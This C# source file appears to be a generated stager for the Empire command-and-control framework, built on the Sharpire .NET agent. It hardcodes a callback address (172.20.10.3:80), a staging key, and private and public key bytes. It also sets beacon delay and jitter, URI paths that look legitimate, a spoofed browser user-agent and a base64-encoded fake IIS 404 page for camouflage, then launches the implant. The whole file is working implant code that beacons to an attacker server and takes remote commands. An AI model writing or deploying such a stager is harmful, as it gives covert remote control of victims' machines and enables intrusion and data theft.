using System;
using Sharpire;

public static class Program
{
    public static void Main()
    {
        try
        {
            string profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            string address = "http://172.20.10.3:80";
            string stagingkey = "KFBp5F3t3sMAdLTUt4qsalZonGQWT90F";
            string workinghours = "";
            string killdate = "";
            uint delay = 5;
            double jitter = 0;
            uint lostlimit = 10;
            string agentlanguage = "dotnet";
            string[] arguments = {address, stagingkey, agentlanguage};
            string defaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg==";
            byte[] skbytes = new byte[] {0xd9,0x8d,0xbe,0x84,0xa4,0x26,0xfa,0xf5,0x61,0x9a,0xec,0xbc,0xb1,0x6b,0x0f,0x98,0x40,0x6d,0x47,0x1f,0xe5,0x84,0x33,0x03,0x5f,0x09,0xe0,0xaa,0x95,0x64,0x59,0x1c};
            byte[] pk = new byte[] {0x93,0xcb,0x17,0x18,0x7d,0xc3,0x03,0x45,0x99,0x90,0xb7,0xa5,0x50,0xbd,0x26,0x5c,0xc3,0x80,0xcd,0x33,0x3c,0xc2,0xb7,0x32,0xb7,0x14,0x05,0xd7,0x52,0x87,0xd6,0x22};
            
            SessionInfo sessionInfo = new SessionInfo(arguments);
            sessionInfo.SetWorkingHours(workinghours);
            sessionInfo.SetKillDate(killdate);
            sessionInfo.SetDefaultJitter(jitter);
            sessionInfo.SetDefaultDelay(delay);
            sessionInfo.SetDefaultLostLimit(lostlimit);
            sessionInfo.SetDefaultResponse(defaultResponse);
            sessionInfo.SetProfile(profile);
            sessionInfo.SetPrivateKeyBytes(skbytes);
            sessionInfo.SetPublicKeyBytes(pk);


            (new EmpireStager(sessionInfo)).Execute();
        }
        catch (Exception e) { Console.WriteLine( e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
    }
}